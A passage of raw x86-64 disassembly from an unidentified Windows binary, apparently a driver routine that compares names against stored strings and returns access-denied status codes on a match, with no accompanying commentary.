   140004873:	48 83 fa 01          	cmp    $0x1,%rdx
   140004877:	0f 85 52 01 00 00    	jne    0x1400049cf
   14000487d:	48 85 db             	test   %rbx,%rbx
   140004880:	0f 84 49 01 00 00    	je     0x1400049cf
   140004886:	48 8b cb             	mov    %rbx,%rcx
   140004889:	ff 15 39 39 00 00    	call   *0x3939(%rip)        # 0x1400081c8
   14000488f:	84 c0                	test   %al,%al
   140004891:	0f 84 38 01 00 00    	je     0x1400049cf
   140004897:	48 8b 13             	mov    (%rbx),%rdx
   14000489a:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000489f:	45 33 c0             	xor    %r8d,%r8d
   1400048a2:	48 8d 0d 57 99 00 00 	lea    0x9957(%rip),%rcx        # 0x14000e200
   1400048a9:	ff 15 69 39 00 00    	call   *0x3969(%rip)        # 0x140008218
   1400048af:	be 22 00 00 c0       	mov    $0xc0000022,%esi
   1400048b4:	85 c0                	test   %eax,%eax
   1400048b6:	78 1c                	js     0x1400048d4
   1400048b8:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400048bd:	4c 8b c5             	mov    %rbp,%r8
   1400048c0:	0f b7 11             	movzwl (%rcx),%edx
   1400048c3:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400048c7:	d1 ea                	shr    $1,%edx
   1400048c9:	e8 aa 1c 00 00       	call   0x140006578
   1400048ce:	48 85 c0             	test   %rax,%rax
   1400048d1:	0f 45 fe             	cmovne %esi,%edi
   1400048d4:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400048d8:	ff 15 ea 38 00 00    	call   *0x38ea(%rip)        # 0x1400081c8
   1400048de:	84 c0                	test   %al,%al
   1400048e0:	0f 84 e9 00 00 00    	je     0x1400049cf
   1400048e6:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400048ea:	0f b7 10             	movzwl (%rax),%edx
   1400048ed:	66 85 d2             	test   %dx,%dx
   1400048f0:	0f 84 d9 00 00 00    	je     0x1400049cf
   1400048f6:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400048fa:	48 85 c9             	test   %rcx,%rcx
   1400048fd:	0f 84 cc 00 00 00    	je     0x1400049cf
   140004903:	4c 8b 05 66 57 00 00 	mov    0x5766(%rip),%r8        # 0x14000a070
   14000490a:	d1 ea                	shr    $1,%edx
   14000490c:	e8 67 1c 00 00       	call   0x140006578
   140004911:	48 85 c0             	test   %rax,%rax
   140004914:	75 22                	jne    0x140004938
   140004916:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000491a:	4c 8b 05 57 57 00 00 	mov    0x5757(%rip),%r8        # 0x14000a078
   140004921:	0f b7 11             	movzwl (%rcx),%edx
   140004924:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140004928:	d1 ea                	shr    $1,%edx
   14000492a:	e8 49 1c 00 00       	call   0x140006578
   14000492f:	48 85 c0             	test   %rax,%rax
   140004932:	0f 84 97 00 00 00    	je     0x1400049cf
   140004938:	8b fe                	mov    %esi,%edi
   14000493a:	e9 90 00 00 00       	jmp    0x1400049cf
   14000493f:	48 85 db             	test   %rbx,%rbx
   140004942:	0f 84 87 00 00 00    	je     0x1400049cf
   140004948:	48 8b cb             	mov    %rbx,%rcx
   14000494b:	ff 15 77 38 00 00    	call   *0x3877(%rip)        # 0x1400081c8
   140004951:	84 c0                	test   %al,%al
   140004953:	74 7a                	je     0x1400049cf
   140004955:	48 8b 13             	mov    (%rbx),%rdx
   140004958:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000495d:	45 33 c0             	xor    %r8d,%r8d
   140004960:	48 8d 0d 99 98 00 00 	lea    0x9899(%rip),%rcx        # 0x14000e200
   140004967:	ff 15 ab 38 00 00    	call   *0x38ab(%rip)        # 0x140008218
   14000496d:	85 c0                	test   %eax,%eax
   14000496f:	78 5e                	js     0x1400049cf
   140004971:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004976:	4c 8b c5             	mov    %rbp,%r8
   140004979:	0f b7 11             	movzwl (%rcx),%edx
   14000497c:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140004980:	d1 ea                	shr    $1,%edx
   140004982:	e8 f1 1b 00 00       	call   0x140006578
   140004987:	48 85 c0             	test   %rax,%rax
   14000498a:	75 3e                	jne    0x1400049ca
   14000498c:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004991:	4c 8b 05 10 57 00 00 	mov    0x5710(%rip),%r8        # 0x14000a0a8
   140004998:	0f b7 11             	movzwl (%rcx),%edx
   14000499b:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000499f:	d1 ea                	shr    $1,%edx
   1400049a1:	e8 d2 1b 00 00       	call   0x140006578
   1400049a6:	48 85 c0             	test   %rax,%rax
   1400049a9:	75 1f                	jne    0x1400049ca
   1400049ab:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400049b0:	4c 8b 05 f9 56 00 00 	mov    0x56f9(%rip),%r8        # 0x14000a0b0
   1400049b7:	0f b7 11             	movzwl (%rcx),%edx
   1400049ba:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400049be:	d1 ea                	shr    $1,%edx
   1400049c0:	e8 b3 1b 00 00       	call   0x140006578
   1400049c5:	48 85 c0             	test   %rax,%rax
   1400049c8:	74 05                	je     0x1400049cf
   1400049ca:	bf 22 00 00 c0       	mov    $0xc0000022,%edi
   1400049cf:	8b c7                	mov    %edi,%eax
   1400049d1:	eb 02                	jmp    0x1400049d5
   1400049d3:	33 c0                	xor    %eax,%eax
   1400049d5:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400049da:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400049df:	48 83 c4 20          	add    $0x20,%rsp
   1400049e3:	41 5e                	pop    %r14
   1400049e5:	5f                   	pop    %rdi
   1400049e6:	5e                   	pop    %rsi
   1400049e7:	c3                   	ret
   1400049e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400049ec:	80 3d 15 98 00 00 00 	cmpb   $0x0,0x9815(%rip)        # 0x14000e208
   1400049f3:	74 14                	je     0x140004a09
   1400049f5:	48 8b 0d 04 98 00 00 	mov    0x9804(%rip),%rcx        # 0x14000e200
   1400049fc:	ff 15 06 38 00 00    	call   *0x3806(%rip)        # 0x140008208
   140004a02:	c6 05 ff 97 00 00 00 	movb   $0x0,0x97ff(%rip)        # 0x14000e208
   140004a09:	48 83 c4 28          	add    $0x28,%rsp
   140004a0d:	c3                   	ret
   140004a0e:	cc                   	int3
   140004a0f:	cc                   	int3
   140004a10:	40 53                	rex push %rbx
   140004a12:	48 83 ec 40          	sub    $0x40,%rsp
   140004a16:	80 3d eb 97 00 00 00 	cmpb   $0x0,0x97eb(%rip)        # 0x14000e208
   140004a1d:	48 8b d9             	mov    %rcx,%rbx
   140004a20:	74 04                	je     0x140004a26
   140004a22:	b0 01                	mov    $0x1,%al
   140004a24:	eb 47                	jmp    0x140004a6d
   140004a26:	48 8d 15 43 2c 00 00 	lea    0x2c43(%rip),%rdx        # 0x140007670
   140004a2d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004a32:	ff 15 08 39 00 00    	call   *0x3908(%rip)        # 0x140008340
   140004a38:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140004a3e:	48 8d 05 bb 97 00 00 	lea    0x97bb(%rip),%rax        # 0x14000e200
   140004a45:	45 33 c9             	xor    %r9d,%r9d
   140004a48:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004a4d:	4c 8b c3             	mov    %rbx,%r8
   140004a50:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004a55:	48 8d 0d b4 fd ff ff 	lea    -0x24c(%rip),%rcx        # 0x140004810
   140004a5c:	ff 15 ae 37 00 00    	call   *0x37ae(%rip)        # 0x140008210
   140004a62:	85 c0                	test   %eax,%eax
   140004a64:	0f 99 c0             	setns  %al
   140004a67:	88 05 9b 97 00 00    	mov    %al,0x979b(%rip)        # 0x14000e208
   140004a6d:	48 83 c4 40          	add    $0x40,%rsp
   140004a71:	5b                   	pop    %rbx
   140004a72:	c3                   	ret
   140004a73:	cc                   	int3
   140004a74:	48 89 0d 95 97 00 00 	mov    %rcx,0x9795(%rip)        # 0x14000e210
   140004a7b:	c3                   	ret
   140004a7c:	40 53                	rex push %rbx
   140004a7e:	48 81 ec 40 04 00 00 	sub    $0x440,%rsp
   140004a85:	48 8b 05 54 56 00 00 	mov    0x5654(%rip),%rax        # 0x14000a0e0
   140004a8c:	48 33 c4             	xor    %rsp,%rax
   140004a8f:	48 89 84 24 30 04 00 	mov    %rax,0x430(%rsp)
   140004a96:	00 
   140004a97:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004a9d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004aa2:	33 d2                	xor    %edx,%edx
   140004aa4:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140004aaa:	e8 91 26 00 00       	call   0x140007140
   140004aaf:	32 db                	xor    %bl,%bl
   140004ab1:	e8 a6 00 00 00       	call   0x140004b5c
   140004ab6:	84 c0                	test   %al,%al
   140004ab8:	0f 84 83 00 00 00    	je     0x140004b41
   140004abe:	48 8b 15 cb 55 00 00 	mov    0x55cb(%rip),%rdx        # 0x14000a090
   140004ac5:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140004aca:	48 8d 0d 5f 97 00 00 	lea    0x975f(%rip),%rcx        # 0x14000e230
   140004ad1:	e8 ba 21 00 00       	call   0x140006c90
   140004ad6:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140004adb:	85 c0                	test   %eax,%eax
   140004add:	78 53                	js     0x140004b32
   140004adf:	48 85 c9             	test   %rcx,%rcx
   140004ae2:	74 5b                	je     0x140004b3f
   140004ae4:	48 8d 51 0c          	lea    0xc(%rcx),%rdx
   140004ae8:	48 85 d2             	test   %rdx,%rdx
   140004aeb:	74 45                	je     0x140004b32
   140004aed:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   140004af1:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   140004af5:	3d ff 03 00 00       	cmp    $0x3ff,%eax
   140004afa:	77 36                	ja     0x140004b32
   140004afc:	45 8b c1             	mov    %r9d,%r8d
   140004aff:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b04:	e8 37 27 00 00       	call   0x140007240
   140004b09:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140004b0f:	48 8d 15 1a af 00 00 	lea    0xaf1a(%rip),%rdx        # 0x14000fa30
   140004b16:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b1b:	e8 da 24 00 00       	call   0x140006ffa
   140004b20:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004b25:	0f b6 db             	movzbl %bl,%ebx
   140004b28:	85 c0                	test   %eax,%eax
   140004b2a:	0f 44 d9             	cmove  %ecx,%ebx
   140004b2d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140004b32:	48 85 c9             	test   %rcx,%rcx
   140004b35:	74 08                	je     0x140004b3f
   140004b37:	33 d2                	xor    %edx,%edx
   140004b39:	ff 15 c9 37 00 00    	call   *0x37c9(%rip)        # 0x140008308
   140004b3f:	8a c3                	mov    %bl,%al
   140004b41:	48 8b 8c 24 30 04 00 	mov    0x430(%rsp),%rcx
   140004b48:	00 
   140004b49:	48 33 cc             	xor    %rsp,%rcx
   140004b4c:	e8 df 24 00 00       	call   0x140007030
   140004b51:	48 81 c4 40 04 00 00 	add    $0x440,%rsp
   140004b58:	5b                   	pop    %rbx
   140004b59:	c3                   	ret
   140004b5a:	cc                   	int3
   140004b5b:	cc                   	int3
   140004b5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b61:	57                   	push   %rdi
   140004b62:	48 83 ec 20          	sub    $0x20,%rsp
   140004b66:	33 db                	xor    %ebx,%ebx
   140004b68:	48 39 1d b1 96 00 00 	cmp    %rbx,0x96b1(%rip)        # 0x14000e220
   140004b6f:	74 07                	je     0x140004b78
   140004b71:	b0 01                	mov    $0x1,%al
   140004b73:	e9 33 01 00 00       	jmp    0x140004cab
   140004b78:	e8 27 1e 00 00       	call   0x1400069a4
   140004b7d:	48 89 05 9c 96 00 00 	mov    %rax,0x969c(%rip)        # 0x14000e220
   140004b84:	48 85 c0             	test   %rax,%rax
   140004b87:	0f 84 14 01 00 00    	je     0x140004ca1
   140004b8d:	33 c0                	xor    %eax,%eax
   140004b8f:	4c 8d 05 9a 96 00 00 	lea    0x969a(%rip),%r8        # 0x14000e230
   140004b96:	41 b9 00 08 00 00    	mov    $0x800,%r9d
   140004b9c:	48 8d 15 8d 9e 00 00 	lea    0x9e8d(%rip),%rdx        # 0x14000ea30
   140004ba3:	49 8b f8             	mov    %r8,%rdi
   140004ba6:	41 8b c9             	mov    %r9d,%ecx
   140004ba9:	f3 aa                	rep stos %al,(%rdi)
   140004bab:	48 8b fa             	mov    %rdx,%rdi
   140004bae:	44 8d 50 02          	lea    0x2(%rax),%r10d
   140004bb2:	41 8b c9             	mov    %r9d,%ecx
   140004bb5:	f3 aa                	rep stos %al,(%rdi)
   140004bb7:	49 8b c8             	mov    %r8,%rcx
   140004bba:	49 2b ca             	sub    %r10,%rcx
   140004bbd:	49 03 ca             	add    %r10,%rcx
   140004bc0:	66 39 19             	cmp    %bx,(%rcx)
   140004bc3:	75 f8                	jne    0x140004bbd
   140004bc5:	4c 8b 0d d4 54 00 00 	mov    0x54d4(%rip),%r9        # 0x14000a0a0
   140004bcc:	33 ff                	xor    %edi,%edi
   140004bce:	41 0f b7 04 79       	movzwl (%r9,%rdi,2),%eax
   140004bd3:	66 89 04 79          	mov    %ax,(%rcx,%rdi,2)
   140004bd7:	48 ff c7             	inc    %rdi
   140004bda:	66 85 c0             	test   %ax,%ax
   140004bdd:	75 ef                	jne    0x140004bce
   140004bdf:	49 8b c8             	mov    %r8,%rcx
   140004be2:	49 2b ca             	sub    %r10,%rcx
   140004be5:	49 03 ca             	add    %r10,%rcx
   140004be8:	66 39 19             	cmp    %bx,(%rcx)
   140004beb:	75 f8                	jne    0x140004be5
   140004bed:	4c 8b 0d 2c 96 00 00 	mov    0x962c(%rip),%r9        # 0x14000e220
   140004bf4:	33 ff                	xor    %edi,%edi
   140004bf6:	41 0f b7 04 79       	movzwl (%r9,%rdi,2),%eax
   140004bfb:	66 89 04 79          	mov    %ax,(%rcx,%rdi,2)
   140004bff:	48 ff c7             	inc    %rdi
   140004c02:	66 85 c0             	test   %ax,%ax
   140004c05:	75 ef                	jne    0x140004bf6
   140004c07:	4d 2b c2             	sub    %r10,%r8
   140004c0a:	4d 03 c2             	add    %r10,%r8
   140004c0d:	66 41 39 18          	cmp    %bx,(%r8)
   140004c11:	75 f7                	jne    0x140004c0a
   140004c13:	48 8b 3d 8e 54 00 00 	mov    0x548e(%rip),%rdi        # 0x14000a0a8
   140004c1a:	33 c9                	xor    %ecx,%ecx
   140004c1c:	0f b7 04 4f          	movzwl (%rdi,%rcx,2),%eax
   140004c20:	66 41 89 04 48       	mov    %ax,(%r8,%rcx,2)
   140004c25:	48 ff c1             	inc    %rcx
   140004c28:	66 85 c0             	test   %ax,%ax
   140004c2b:	75 ef                	jne    0x140004c1c
   140004c2d:	48 8b ca             	mov    %rdx,%rcx
   140004c30:	49 2b ca             	sub    %r10,%rcx
   140004c33:	49 03 ca             	add    %r10,%rcx
   140004c36:	66 39 19             	cmp    %bx,(%rcx)
   140004c39:	75 f8                	jne    0x140004c33
   140004c3b:	4c 8b 05 5e 54 00 00 	mov    0x545e(%rip),%r8        # 0x14000a0a0
   140004c42:	33 ff                	xor    %edi,%edi
   140004c44:	41 0f b7 04 78       	movzwl (%r8,%rdi,2),%eax
   140004c49:	66 89 04 79          	mov    %ax,(%rcx,%rdi,2)
   140004c4d:	48 ff c7             	inc    %rdi
   140004c50:	66 85 c0             	test   %ax,%ax
   140004c53:	75 ef                	jne    0x140004c44
   140004c55:	48 8b ca             	mov    %rdx,%rcx
   140004c58:	49 2b ca             	sub    %r10,%rcx
   140004c5b:	49 03 ca             	add    %r10,%rcx
   140004c5e:	66 39 19             	cmp    %bx,(%rcx)
   140004c61:	75 f8                	jne    0x140004c5b
   140004c63:	4c 8b 05 b6 95 00 00 	mov    0x95b6(%rip),%r8        # 0x14000e220
   140004c6a:	33 ff                	xor    %edi,%edi
   140004c6c:	41 0f b7 04 78       	movzwl (%r8,%rdi,2),%eax
   140004c71:	66 89 04 79          	mov    %ax,(%rcx,%rdi,2)
   140004c75:	48 ff c7             	inc    %rdi
   140004c78:	66 85 c0             	test   %ax,%ax
   140004c7b:	75 ef                	jne    0x140004c6c
   140004c7d:	49 2b d2             	sub    %r10,%rdx
   140004c80:	49 03 d2             	add    %r10,%rdx
   140004c83:	66 39 1a             	cmp    %bx,(%rdx)
   140004c86:	75 f8                	jne    0x140004c80
   140004c88:	48 8b 3d 21 54 00 00 	mov    0x5421(%rip),%rdi        # 0x14000a0b0
   140004c8f:	33 c9                	xor    %ecx,%ecx
   140004c91:	0f b7 04 4f          	movzwl (%rdi,%rcx,2),%eax
   140004c95:	66 89 04 4a          	mov    %ax,(%rdx,%rcx,2)
   140004c99:	48 ff c1             	inc    %rcx
   140004c9c:	66 85 c0             	test   %ax,%ax
   140004c9f:	75 f0                	jne    0x140004c91
   140004ca1:	48 39 1d 78 95 00 00 	cmp    %rbx,0x9578(%rip)        # 0x14000e220
   140004ca8:	0f 95 c0             	setne  %al
   140004cab:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004cb0:	48 83 c4 20          	add    $0x20,%rsp
   140004cb4:	5f                   	pop    %rdi
   140004cb5:	c3                   	ret
   140004cb6:	cc                   	int3
   140004cb7:	cc                   	int3
   140004cb8:	48 83 ec 28          	sub    $0x28,%rsp
   140004cbc:	e8 9b fe ff ff       	call   0x140004b5c
   140004cc1:	84 c0                	test   %al,%al
   140004cc3:	75 02                	jne    0x140004cc7
   140004cc5:	eb 5e                	jmp    0x140004d25
   140004cc7:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004ccc:	48 8d 0d 5d 95 00 00 	lea    0x955d(%rip),%rcx        # 0x14000e230
   140004cd3:	e8 ac 1b 00 00       	call   0x140006884
   140004cd8:	85 c0                	test   %eax,%eax
   140004cda:	78 16                	js     0x140004cf2
   140004cdc:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004ce1:	b2 01                	mov    $0x1,%dl
   140004ce3:	e8 9c 19 00 00       	call   0x140006684
   140004ce8:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004ced:	e8 7a 1b 00 00       	call   0x14000686c
   140004cf2:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140004cf8:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004cfd:	48 8d 0d 2c 9d 00 00 	lea    0x9d2c(%rip),%rcx        # 0x14000ea30
   140004d04:	e8 7b 1b 00 00       	call   0x140006884
   140004d09:	85 c0                	test   %eax,%eax
   140004d0b:	78 16                	js     0x140004d23
   140004d0d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004d12:	b2 01                	mov    $0x1,%dl
   140004d14:	e8 6b 19 00 00       	call   0x140006684
   140004d19:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004d1e:	e8 49 1b 00 00       	call   0x14000686c
   140004d23:	b0 01                	mov    $0x1,%al
   140004d25:	48 83 c4 28          	add    $0x28,%rsp
   140004d29:	c3                   	ret
   140004d2a:	cc                   	int3
   140004d2b:	cc                   	int3
   140004d2c:	48 8b c4             	mov    %rsp,%rax
   140004d2f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004d33:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004d37:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140004d3b:	41 56                	push   %r14
   140004d3d:	48 83 ec 30          	sub    $0x30,%rsp
   140004d41:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004d44:	49 8b d8             	mov    %r8,%rbx
   140004d47:	4c 8b c9             	mov    %rcx,%r9
   140004d4a:	0f 11 40 e8          	movups %xmm0,-0x18(%rax)
   140004d4e:	84 d2                	test   %dl,%dl
   140004d50:	0f 84 c2 00 00 00    	je     0x140004e18
   140004d56:	48 85 c9             	test   %rcx,%rcx
   140004d59:	0f 84 b9 00 00 00    	je     0x140004e18
   140004d5f:	80 39 00             	cmpb   $0x0,(%rcx)
   140004d62:	0f 84 b0 00 00 00    	je     0x140004e18
   140004d68:	4c 8d 35 c1 a4 00 00 	lea    0xa4c1(%rip),%r14        # 0x14000f230
   140004d6f:	bd 00 04 00 00       	mov    $0x400,%ebp
   140004d74:	33 c0                	xor    %eax,%eax
   140004d76:	49 8b fe             	mov    %r14,%rdi
   140004d79:	8b cd                	mov    %ebp,%ecx
   140004d7b:	44 8b c5             	mov    %ebp,%r8d
   140004d7e:	f3 aa                	rep stos %al,(%rdi)
   140004d80:	49 8b c9             	mov    %r9,%rcx
   140004d83:	49 8b d6             	mov    %r14,%rdx
   140004d86:	e8 ed da ff ff       	call   0x140002878
   140004d8b:	84 c0                	test   %al,%al
   140004d8d:	0f 84 85 00 00 00    	je     0x140004e18
   140004d93:	48 8b 15 6e 52 00 00 	mov    0x526e(%rip),%rdx        # 0x14000a008
   140004d9a:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   140004da0:	49 8b ce             	mov    %r14,%rcx
   140004da3:	e8 70 20 00 00       	call   0x140006e18
   140004da8:	48 85 c0             	test   %rax,%rax
   140004dab:	74 6b                	je     0x140004e18
   140004dad:	8b d5                	mov    %ebp,%edx
   140004daf:	49 8b ce             	mov    %r14,%rcx
   140004db2:	e8 79 d7 ff ff       	call   0x140002530
   140004db7:	48 8b f8             	mov    %rax,%rdi
   140004dba:	48 85 c0             	test   %rax,%rax
   140004dbd:	74 55                	je     0x140004e14
   140004dbf:	4c 8d 35 6a a8 00 00 	lea    0xa86a(%rip),%r14        # 0x14000f630
   140004dc6:	44 8b c5             	mov    %ebp,%r8d
   140004dc9:	49 8b d6             	mov    %r14,%rdx
   140004dcc:	48 8b c8             	mov    %rax,%rcx
   140004dcf:	e8 1a 22 00 00       	call   0x140006fee
   140004dd4:	85 c0                	test   %eax,%eax
   140004dd6:	74 39                	je     0x140004e11
   140004dd8:	44 8b c5             	mov    %ebp,%r8d
   140004ddb:	48 8b d7             	mov    %rdi,%rdx
   140004dde:	49 8b ce             	mov    %r14,%rcx
   140004de1:	e8 0e 22 00 00       	call   0x140006ff4
   140004de6:	49 8b d6             	mov    %r14,%rdx
   140004de9:	c6 05 3f ac 00 00 00 	movb   $0x0,0xac3f(%rip)        # 0x14000fa2f
   140004df0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004df5:	ff 15 4d 35 00 00    	call   *0x354d(%rip)        # 0x140008348
   140004dfb:	48 8d 15 2e ac 00 00 	lea    0xac2e(%rip),%rdx        # 0x14000fa30
   140004e02:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004e07:	e8 e8 16 00 00       	call   0x1400064f4
   140004e0c:	c6 03 01             	movb   $0x1,(%rbx)
   140004e0f:	eb 03                	jmp    0x140004e14
   140004e11:	c6 03 00             	movb   $0x0,(%rbx)
   140004e14:	b0 01                	mov    $0x1,%al
   140004e16:	eb 02                	jmp    0x140004e1a
   140004e18:	32 c0                	xor    %al,%al
   140004e1a:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004e1f:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140004e24:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140004e29:	48 83 c4 30          	add    $0x30,%rsp
   140004e2d:	41 5e                	pop    %r14
   140004e2f:	c3                   	ret
   140004e30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004e35:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004e3a:	57                   	push   %rdi
   140004e3b:	48 83 ec 30          	sub    $0x30,%rsp
   140004e3f:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140004e43:	48 8d 35 e6 a7 00 00 	lea    0xa7e6(%rip),%rsi        # 0x14000f630
   140004e4a:	48 8b df             	mov    %rdi,%rbx
   140004e4d:	48 ff c3             	inc    %rbx
   140004e50:	80 3c 1e 00          	cmpb   $0x0,(%rsi,%rbx,1)
   140004e54:	75 f7                	jne    0x140004e4d
   140004e56:	e8 01 fd ff ff       	call   0x140004b5c
   140004e5b:	84 c0                	test   %al,%al
   140004e5d:	0f 84 b6 00 00 00    	je     0x140004f19
   140004e63:	8d 43 ff             	lea    -0x1(%rbx),%eax
   140004e66:	3d fe 01 00 00       	cmp    $0x1fe,%eax
   140004e6b:	0f 87 a6 00 00 00    	ja     0x140004f17
   140004e71:	4c 8d 0d b8 ab 00 00 	lea    0xabb8(%rip),%r9        # 0x14000fa30
   140004e78:	48 ff c7             	inc    %rdi
   140004e7b:	66 41 83 3c 79 00    	cmpw   $0x0,(%r9,%rdi,2)
   140004e81:	75 f5                	jne    0x140004e78
   140004e83:	48 8b 15 06 52 00 00 	mov    0x5206(%rip),%rdx        # 0x14000a090
   140004e8a:	48 8d 0d 9f 93 00 00 	lea    0x939f(%rip),%rcx        # 0x14000e230
   140004e91:	03 ff                	add    %edi,%edi
   140004e93:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004e99:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140004e9d:	e8 ea 1e 00 00       	call   0x140006d8c
   140004ea2:	33 d2                	xor    %edx,%edx
   140004ea4:	48 8d 0d 9d b3 00 00 	lea    0xb39d(%rip),%rcx        # 0x140010248
   140004eab:	41 b8 e8 03 00 00    	mov    $0x3e8,%r8d
   140004eb1:	e8 8a 22 00 00       	call   0x140007140
   140004eb6:	0f 10 05 fb 51 00 00 	movups 0x51fb(%rip),%xmm0        # 0x14000a0b8
   140004ebd:	48 8d 0d 84 b3 00 00 	lea    0xb384(%rip),%rcx        # 0x140010248
   140004ec4:	4c 63 c3             	movslq %ebx,%r8
   140004ec7:	f2 0f 10 0d f9 51 00 	movsd  0x51f9(%rip),%xmm1        # 0x14000a0c8
   140004ece:	00 
   140004ecf:	48 8b d6             	mov    %rsi,%rdx
   140004ed2:	0f 29 05 57 b3 00 00 	movaps %xmm0,0xb357(%rip)        # 0x140010230
   140004ed9:	f2 0f 11 0d 5f b3 00 	movsd  %xmm1,0xb35f(%rip)        # 0x140010240
   140004ee0:	00 
   140004ee1:	e8 5a 23 00 00       	call   0x140007240
   140004ee6:	48 8b 15 93 51 00 00 	mov    0x5193(%rip),%rdx        # 0x14000a080
   140004eed:	8d 0c 5d 18 00 00 00 	lea    0x18(,%rbx,2),%ecx
   140004ef4:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140004ef8:	4c 8d 0d 31 b3 00 00 	lea    0xb331(%rip),%r9        # 0x140010230
   140004eff:	48 8d 0d 2a 9b 00 00 	lea    0x9b2a(%rip),%rcx        # 0x14000ea30
   140004f06:	88 1d 38 b3 00 00    	mov    %bl,0xb338(%rip)        # 0x140010244
   140004f0c:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004f12:	e8 75 1e 00 00       	call   0x140006d8c
   140004f17:	b0 01                	mov    $0x1,%al
   140004f19:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004f1e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140004f23:	48 83 c4 30          	add    $0x30,%rsp
   140004f27:	5f                   	pop    %rdi
   140004f28:	c3                   	ret
   140004f29:	cc                   	int3
   140004f2a:	cc                   	int3
   140004f2b:	cc                   	int3
   140004f2c:	48 83 ec 68          	sub    $0x68,%rsp
   140004f30:	48 8b 05 a9 51 00 00 	mov    0x51a9(%rip),%rax        # 0x14000a0e0
   140004f37:	48 33 c4             	xor    %rsp,%rax
   140004f3a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140004f3f:	48 83 3d f1 b6 00 00 	cmpq   $0x0,0xb6f1(%rip)        # 0x140010638
   140004f46:	00 
   140004f47:	75 07                	jne    0x140004f50
   140004f49:	b8 08 00 00 c0       	mov    $0xc0000008,%eax
   140004f4e:	eb 56                	jmp    0x140004fa6
   140004f50:	33 c0                	xor    %eax,%eax
   140004f52:	4c 8d 05 e7 b6 00 00 	lea    0xb6e7(%rip),%r8        # 0x140010640
   140004f59:	48 89 44 24 44       	mov    %rax,0x44(%rsp)
   140004f5e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004f63:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004f66:	48 8d 05 33 04 00 00 	lea    0x433(%rip),%rax        # 0x1400053a0
   140004f6d:	0f 11 44 24 34       	movups %xmm0,0x34(%rsp)
   140004f72:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004f77:	48 8d 05 a2 05 00 00 	lea    0x5a2(%rip),%rax        # 0x140005520
   140004f7e:	0f 11 44 24 24       	movups %xmm0,0x24(%rsp)
   140004f83:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004f88:	48 8d 05 c1 cc ff ff 	lea    -0x333f(%rip),%rax        # 0x140001c50
   140004f8f:	0f 10 05 52 35 00 00 	movups 0x3552(%rip),%xmm0        # 0x1400084e8
   140004f96:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004f9b:	f3 0f 7f 44 24 20    	movdqu %xmm0,0x20(%rsp)
   140004fa1:	e8 33 1f 00 00       	call   0x140006ed9
   140004fa6:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140004fab:	48 33 cc             	xor    %rsp,%rcx
